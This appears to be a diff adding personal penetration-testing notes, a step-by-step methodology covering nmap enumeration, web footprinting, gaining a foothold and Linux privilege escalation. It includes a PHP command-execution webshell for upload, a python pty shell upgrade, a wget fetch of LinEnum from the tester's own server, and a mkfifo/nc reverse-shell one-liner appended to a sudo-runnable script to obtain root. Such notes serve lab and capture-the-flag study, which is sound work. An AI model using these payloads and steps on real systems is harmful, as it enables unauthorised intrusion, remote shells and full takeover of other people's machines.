@@ -1,0 +1,44 @@
+A. Information Gathering
+    1. Enumeration
+        - nmap scan to look for open ports: nmap -sV --open -oA [file name for initial scan output] [ip]
+            - get in the habit of sending your scans to files for proper notetaking and backup
+            - Try to figure out what OS the host is, any available web servers, what type of web server they are.
+
+        - run full TCP port scan: nmap -p- --open -oa [file name for full scan] [ip]
+            - This will check for non-standard ports that we may have missed above, it'll take forever so just let it do its thing.
+
+        - banner grabbing with nc -nv [ip] : [port]
+            - nc -nv [ip] 22 -> check what kind of SSH version it is, can check port 80 to see what type of webserver, etc etc
+
+        - Run an nmap script scan (this is an intrusive scan, be careful): nmap -sC -p [ports to hit, comma seperated] -oA [name of script scan] [ip]
+
+        - run http-enum script: nmap -sV --script=http-enum -oA [name of http enum log file] [ip]
+
+    2. Web Footprinting:
+        - Use whatweb to identify the web app in use: whatweb [ip]
+        - Navigate to IP, see if there's anything interesting.
+        - Open source code [Cntrl + U] and look for anything interesting (comments, etc)
+        - cUrl [web URL]
+        - Use Gobuster to look for any other accessible directories: gobuster dir -u [website] --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+
+B. Getting an Initial Foothold
+    - Either use Metasploit to send a payload that can give you shell access
+    - Or try to find a place on the webserver where you could get remote code execution to work, say for example, an image uploader?
+        - Instead of uploading an image, upload a file with this PHP code: <?php system('id'); ?>
+        - See if it runs, if it does, you've got remote code execution, you just need a reverse shell now. See /Tools/Shells for info.
+        - Once you have a reverse shell, upgrade it into a "nicer shell" either with the commands listed in /Tools/Shells, or something like python -c 'import pty; pty.spawn("/bin/bash")' or if python2 doesn't exist, python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+C. Priviledge Escalation
+    - run https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh on the target system to do some automated priviledge escalation searches
+        - download the file on your system, then open a terminal and run: sudo python3 -m http.server 8080
+        - then go to your target and type wget http://<your ip>:8080/LinEnum.sh to pull it to your server. 
+        - chmod +x LinEnum.sh to make the script executable, then run it with ./LinEnum.sh
+    - use sudo -l to find a list of sudo-able things on your user and see if you can exploit that
+        - Such as swapping a sudo runnable script with another script that gives you priviledge escalation?
+            - APPEND TO THE END OF THE FILE a reverse shell script echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [home ip] [2nd port] >/tmp/f' | tee -a [file to append to]
+                - NEVER OVERRIDE A FILE SO THAT YOU CAN ALWAYS UNDO AFTERWARDS
+                - ALSO MAKE A BACKUP OF THAT FILE
+
+        - Open up another nc -lvnp [second port]
+        - Now you have root access :)
+
